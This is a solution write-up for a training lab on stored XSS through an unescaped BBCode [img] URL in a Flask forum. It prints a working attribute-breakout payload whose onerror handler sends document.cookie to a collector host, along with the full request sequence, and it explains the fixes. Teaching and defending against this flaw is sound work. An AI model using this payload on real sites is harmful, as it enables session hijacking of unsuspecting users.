# Solution — Stored XSS via BBCode [img] Attribute Smuggling

**CWE-79 / OWASP A03:2021 – Injection.** Improper neutralization of input during
web page generation, in **HTML-attribute context** specifically.

## The sink

`POST /topics` renders the body through a hand-rolled BBCode renderer,
`render_bbcode()`:

```python
IMG_RE = re.compile(r"\[img\](.*?)\[/img\]", re.I | re.S)

def render_bbcode(body):
    out, pos = [], 0
    for m in IMG_RE.finditer(body):
        out.append(html.escape(body[pos:m.start()]))     # surrounding text: SAFE
        out.append('<img src="' + m.group(1) + '">')      # captured URL: RAW  <-- flaw
        pos = m.end()
    out.append(html.escape(body[pos:]))
    return "".join(out)
```

Every part of the body is `html.escape()`d **except** the URL captured between
`[img]` and `[/img]`, which is concatenated straight into `src="..."`. So the
_only_ injection vector in a rendered post is that URL — but it is a complete
one.

The rendered post is stored and later emitted on `GET /admin/topics`, which is
gated by the admin `session` cookie:

```python
if not hmac.compare_digest(request.cookies.get("session", ""), ADMIN_SESSION):
    return Response("forbidden", status=403)
```

You cannot load that page. The admin bot can, and it renders your stored post
there.

## Why escaping the body is not enough — HTML-attribute context

It is tempting to think "the renderer escapes the body, so it's safe." It escapes
the body **as element text**, where the dangerous characters are `<` and `>`
(they start/stop tags). But the captured URL is not in element-text context — it
is placed **inside a double-quoted attribute value**:

```html
<img src="  HERE  " />
```

In attribute context the character that matters is the **quote that delimits the
value**. If a `"` reaches the output unencoded, it terminates `src` early and the
parser reads whatever follows as further attributes on the same tag. Escaping
`<`/`>` does nothing to stop this; you never need a `<` or `>` at all. The
correct neutralization for this context is to encode the delimiter — turn `"`
into `&quot;` — which `render_bbcode()` fails to do for the URL.

## The payload

Give `[img]` a "URL" that closes `src` and opens an `onerror`:

```
[img]x" onerror="new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)"[/img]
```

`render_bbcode()` emits, verbatim:

```html
<img
  src="x"
  onerror="new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)"
/>
```

- `src="x"` — the closing `"` is _your_ quote; `x` is not a real image, so the
  load fails.
- On load failure the browser runs the **`onerror`** attribute — no click, no
  submit, it fires the moment the admin bot renders the board.
- `new Image().src = '…' + encodeURIComponent(document.cookie)` fires a
  cross-origin GET to the in-lab collector. Image loads are not subject to the
  same-origin _read_ barrier — the request still goes out, which is all we need —
  and the cookie is readable because it is **not** `HttpOnly`.

`onerror` is used (rather than `onload`) precisely because `src="x"` cannot
resolve to a real image; a load failure is guaranteed, so the handler is
guaranteed to run.

## End-to-end

```
POST /topics
Content-Type: application/json

{"title":"pic","body":"[img]x\" onerror=\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\"[/img]"}

# wait for the admin bot to load /admin/topics (~2s)
GET  /oob/received      # app-side proxy to the collector; find /report?c=session%3D<32hex>
POST /solve      {"c":"<32hex>"}     ->  FLAG{...}
```

`tests/exploit.py` automates this: assert `/admin/topics` is `403` without the
cookie → post the topic → poll `/oob/received` → URL-decode and parse the 32-hex
session → `/solve`.

## Why the containment holds

- The collector and admin bot live on a `backend` network with `internal: true`
  — **no route off the host**. The stolen cookie can reach the in-lab collector
  but never the internet, so the lab ships a real cookie-exfil primitive at
  `risk: low`.
- The admin bot's cookie-minting endpoint (`/internal/bot-login`) is firewalled
  to the backend subnet **and** gated by a `BOT_KEY`, so a lab visitor on the
  public side cannot request the admin cookie via `Set-Cookie` and skip the XSS.
- `/admin/topics` is admin-cookie-gated; there is no queue endpoint. The stored
  attribute-smuggling payload is the _only_ way to obtain the admin session.

## The fixes (independent — either one breaks the exploit)

1. **HTML-attribute-encode the URL (root cause).** Escape the captured URL the
   same way the rest of the body is escaped before putting it in the attribute:

   ```python
   out.append('<img src="' + html.escape(m.group(1), quote=True) + '">')
   ```

   `html.escape(..., quote=True)` turns `"` into `&quot;`, so the payload becomes
   the literal `src` value `x&quot; onerror=&quot;...` — an image URL, not an
   attribute break-out. (Better still, validate the URL against an
   `http(s)://` allowlist and reject anything else.) This kills the injection at
   the source, in the correct context.

2. **`HttpOnly` session cookie (defence in depth).** `Set-Cookie: session=…;
HttpOnly` makes `document.cookie` unable to read it, so even a successful
   attribute break-out cannot steal the session. Fix both.

A strict `Content-Security-Policy` that forbids inline event-handler attributes
(no `unsafe-inline`) would also have blocked this specific `onerror`; CSP is
explored in later labs. The primary, context-correct remedy remains
HTML-attribute encoding of any user data placed inside an attribute value.

## Note on the stack (re-platform)

The canonical form of this bug is the phpBB / vBulletin-era BBCode `[img]`
attribute-injection XSS (PHP forums that built `<img src="$url">` by string
concatenation). Per the project's Flask-default Hybrid policy this lab is
**re-platformed to Python/Flask** with a hand-rolled `render_bbcode()`. The
lesson — that HTML-attribute context needs attribute encoding, and that escaping
element text is not the same thing — is framework-independent: the identical
mistake occurs in PHP, Node/EJS, Ruby ERB, Go `text/template`, and any renderer
that concatenates user data into an attribute without encoding the delimiter.
